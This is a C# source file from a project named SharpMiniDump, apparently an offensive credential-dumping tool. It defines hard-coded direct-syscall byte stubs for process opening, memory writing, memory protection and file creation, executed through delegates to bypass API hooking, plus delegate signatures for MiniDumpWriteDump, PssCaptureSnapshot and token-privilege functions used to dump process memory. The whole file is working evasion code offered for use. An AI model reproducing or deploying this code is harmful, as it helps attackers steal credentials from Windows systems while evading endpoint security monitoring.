using System;
using System.Runtime.InteropServices;
using System.Security;
using static SharpMiniDump.Natives;

namespace SharpMiniDump
{
    class NativeSysCall
    {
        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x0f
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwClose10 = { 0x49, 0x89, 0xCA, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x3A
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwWriteVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x50
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwProtectVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x55
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtCreateFile10 = { 0x49, 0x89, 0xCA, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        ///0:  49 89 ca                mov r10,rcx
        ///3:  b8 26 00 00 00          mov eax,0x26
        ///8:  0f 05                   syscall
        ///a:  c3                      ret

        static byte[] bZwOpenProcess10 = { 0x49, 0x89, 0xCA, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0xC6
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtCreateTransaction10 = { 0x49, 0x89, 0xCA, 0xB8, 0xC6, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        public static NTSTATUS NtCreateTransaction10(out IntPtr tHandle, int desiredAccess, IntPtr objAttr, IntPtr Uow, IntPtr TmHandle, ulong createOptions, ulong isolationLevel, ulong isolationFlags, IntPtr Timeout, IntPtr Description)
        {
            byte[] syscall = bNtCreateTransaction10;

            IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

            Delegates.NtCreateTransaction myAssemblyFunction = (Delegates.NtCreateTransaction)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateTransaction));

            return (NTSTATUS)myAssemblyFunction(out tHandle, desiredAccess, objAttr, Uow, TmHandle, createOptions, isolationLevel, isolationFlags, Timeout, Description);
        }

        public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
            byte[] syscall = bZwOpenProcess10;

            IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);
            
            Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

            return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
            
        }

        public static NTSTATUS ZwClose10(IntPtr handle)
        {
            byte[] syscall = bZwClose10;

            IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);
            
            Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose));

            return (NTSTATUS)myAssemblyFunction(handle);
            
        }
        
        public static NTSTATUS ZwWriteVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
        {
            byte[] syscall = bZwWriteVirtualMemory10;

            IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);
            
            Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            
        }

        public static NTSTATUS ZwProtectVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten)
        {
            byte[] syscall = bZwProtectVirtualMemory10;

            IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

            Delegates.ZwProtectVirtualMemory myAssemblyFunction = (Delegates.ZwProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwProtectVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, ref lpBaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
            
        }

        public static NTSTATUS NtCreateFile10(out IntPtr fileHandle, Int32 desiredAccess, ref OBJECT_ATTRIBUTES objectAttributes, out IO_STATUS_BLOCK ioStatusBlock, ref Int64 allocationSize, UInt32 fileAttributes, System.IO.FileShare shareAccess, UInt32 createDisposition, UInt32 createOptions, IntPtr eaBuffer, UInt32 eaLength)
        {
            byte[] syscall = bNtCreateFile10;

            IntPtr memoryAddress = msil.getAdrressWithMSIL(syscall);

            Delegates.NtCreateFile myAssemblyFunction = (Delegates.NtCreateFile)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateFile));

            return (NTSTATUS)myAssemblyFunction(out fileHandle, desiredAccess,ref objectAttributes,out ioStatusBlock,ref allocationSize, fileAttributes, shareAccess, createDisposition, createOptions, eaBuffer, eaLength);
            
        }

        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateTransaction(out IntPtr tHandle, int desiredAccess, IntPtr objAttr, IntPtr Uow, IntPtr TmHandle, ulong createOptions, ulong isolationLevel, ulong isolationFlags, IntPtr Timeout, IntPtr Description);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwClose(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwProtectVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateFile(out IntPtr fileHandle, Int32 desiredAccess, ref OBJECT_ATTRIBUTES objectAttributes, out IO_STATUS_BLOCK ioStatusBlock, ref Int64 allocationSize, UInt32 fileAttributes, System.IO.FileShare shareAccess, UInt32 createDisposition, UInt32 createOptions, IntPtr eaBuffer, UInt32 eaLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
            
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Natives.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
                        
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate IntPtr GetCurrentProcess();

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool CloseHandle(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);
            
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint newprotect, out uint oldprotect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool LookupPrivilegeValue(String lpSystemName, String lpName, ref LUID luid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int PssCaptureSnapshot(IntPtr ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, int ThreadContextFlags, ref IntPtr SnapshotHandle);
        }
    }
}
